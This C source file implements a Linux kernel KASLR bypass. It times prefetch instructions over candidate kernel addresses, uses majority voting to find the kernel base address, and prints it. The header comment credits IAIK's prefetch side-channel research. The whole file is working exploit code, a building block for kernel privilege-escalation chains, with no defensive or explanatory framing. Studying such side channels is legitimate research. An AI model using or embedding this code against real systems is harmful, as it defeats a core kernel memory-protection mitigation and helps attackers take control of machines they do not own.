#include <stdint.h>
#include <stdio.h>
#include "kaslr_bypass.h"

#define ARRAY_LEN(x) (sizeof(x) / sizeof(x[0]))
#define logd(fmt, ...) dprintf(2, "[*] %s:%d " fmt "\n", __FILE__, __LINE__, ##__VA_ARGS__)

uint64_t kaslr = -1;

// KASLR bypass
//
// This code is adapted from https://github.com/IAIK/prefetch/blob/master/cacheutils.h
//
inline __attribute__((always_inline)) uint64_t rdtsc_begin() {
	uint64_t a, d;
	asm volatile ("mfence\n\t"
		"RDTSCP\n\t"
		"mov %%rdx, %0\n\t"
		"mov %%rax, %1\n\t"
		"xor %%rax, %%rax\n\t"
		"lfence\n\t"
		: "=r" (d), "=r" (a)
		:
		: "%rax", "%rbx", "%rcx", "%rdx");
	a = (d<<32) | a;
	return a;
}

inline __attribute__((always_inline)) uint64_t rdtsc_end() {
	uint64_t a, d;
	asm volatile(
		"xor %%rax, %%rax\n\t"
		"lfence\n\t"
		"RDTSCP\n\t"
		"mov %%rdx, %0\n\t"
		"mov %%rax, %1\n\t"
		"mfence\n\t"
		: "=r" (d), "=r" (a)
		:
		: "%rax", "%rbx", "%rcx", "%rdx");
	a = (d<<32) | a;
	return a;
}

void prefetch(void* p)
{
	asm volatile (
	"prefetchnta (%0)\n"
	"prefetcht2 (%0)\n"
	: : "r" (p));
}

size_t flushandreload(void* addr) // row miss
{
	size_t time = rdtsc_begin();
	prefetch(addr);
	size_t delta = rdtsc_end() - time;
	return delta;
}

int bypass_kaslr(uint64_t base) {
	if (!base) {
	#ifdef KASLR_BYPASS_INTEL
		#define OFFSET 0
		#define START (0xffffffff81000000ull + OFFSET)
		#define END   (0xffffffffD0000000ull + OFFSET)
		#define STEP   0x0000000001000000ull
		while (1) {
			uint64_t bases[7] = {0};
			for (int vote = 0; vote < ARRAY_LEN(bases); vote ++) {
				size_t times[(END - START) / STEP] = {};
				uint64_t addrs[(END - START) / STEP];

				for (int ti = 0; ti < ARRAY_LEN(times); ti++) {
					times[ti] = ~0;
					addrs[ti] = START + STEP * (uint64_t)ti;
				}

				for (int i = 0; i < 16; i++) {
				for (int ti = 0; ti < ARRAY_LEN(times); ti++) {
					uint64_t addr = addrs[ti];
					size_t t = flushandreload((void*)addr);
					if (t < times[ti]) {
						times[ti] = t;
					}
				}
				}

				size_t minv = ~0;
				size_t mini = -1;
				for (int ti = 0; ti < ARRAY_LEN(times) - 1; ti++) {
					if (times[ti] < minv) {
						mini = ti;
						minv = times[ti];
					}
				}

				if (mini < 0) {
					return -1;
				}

				bases[vote] = addrs[mini];
			}

			int c = 0;
			for (int i = 0; i < ARRAY_LEN(bases); i++) {
				if (c == 0) {
					base = bases[i];
				} else if (base == bases[i]) {
					c++;
				} else {
					c--;
				}
			}

			c = 0;
			for (int i = 0; i < ARRAY_LEN(bases); i++) {
				if (base == bases[i]) {
					c++;
				}
			}
			if (c > ARRAY_LEN(bases) / 2) {
				base -= OFFSET;
				goto got_base;
			}

			logd("majority vote failed:\n");
			logd("base = 0x%lx with %d votes\n", base, c);
		}
	#else
		#define START (0xffffffff81000000ull)
		#define END (0xffffffffc0000000ull)
		#define STEP 0x0000000000200000ull
		#define NUM_TRIALS 9
		// largest contiguous mapped area at the beginning of _stext
		#define WINDOW_SIZE 11

		while (1) {
			uint64_t bases[NUM_TRIALS] = {0};

			for (int vote = 0; vote < ARRAY_LEN(bases); vote ++) {
				size_t times[(END - START) / STEP] = {};
				uint64_t addrs[(END - START) / STEP];

				for (int ti = 0; ti < ARRAY_LEN(times); ti++) {
					times[ti] = ~0;
					addrs[ti] = START + STEP * (uint64_t)ti;
				}

				for (int i = 0; i < 16; i++) {
				for (int ti = 0; ti < ARRAY_LEN(times); ti++) {
					uint64_t addr = addrs[ti];
					size_t t = flushandreload((void*)addr);
					if (t < times[ti]) {
						times[ti] = t;
					}
				}
				}

				uint64_t max = 0;
				int max_i = 0;
				for (int ti = 0; ti < ARRAY_LEN(times) - WINDOW_SIZE; ti++) {
					uint64_t sum = 0;
					for (int i = 0; i < WINDOW_SIZE; i++) {
						sum += times[ti + i];
					}
					if (sum > max) {
						max = sum;
						max_i = ti;
					}
				}

				bases[vote] = addrs[max_i];
			}

			int c = 0;
			for (int i = 0; i < ARRAY_LEN(bases); i++) {
				if (c == 0) {
					base = bases[i];
				} else if (base == bases[i]) {
					c++;
				} else {
					c--;
				}
			}

			c = 0;
			for (int i = 0; i < ARRAY_LEN(bases); i++) {
				if (base == bases[i]) {
					c++;
				}
			}
			if (c > ARRAY_LEN(bases) / 2) {
				goto got_base;
			}

			logd("majority vote failed:\n");
			logd("base = 0x%lx with %d votes\n", base, c);
		}
	#endif
	}

got_base:
	logd("Using kernel base 0x%lx", base);
	kaslr = base;

	return 0;
}

void leak_kaslr(void)
{
    bypass_kaslr(0);
    printf("[+] kernel base: 0x%lx\n", kaslr);
}
